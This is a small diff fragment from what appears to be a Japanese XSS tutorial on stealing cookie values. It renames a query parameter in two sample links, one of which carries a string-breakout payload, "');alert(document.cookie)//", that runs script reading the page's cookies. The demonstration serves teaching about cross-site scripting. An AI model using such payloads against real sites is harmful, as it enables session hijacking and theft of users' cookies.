@@ -45,5 +45,5 @@ XSSでCookie値の盗み出してみます
 
 # 6. 
 
-<a href="./other?initMsg=hello&url=https://google.co.jp">正常系2</a>
-<a href="./other?initMsg=');alert(document.cookie)//&url=">正常系2</a>
+<a href="./other?message=hello&url=https://google.co.jp">正常系2</a>
+<a href="./other?message=');alert(document.cookie)//&url=">正常系2</a>
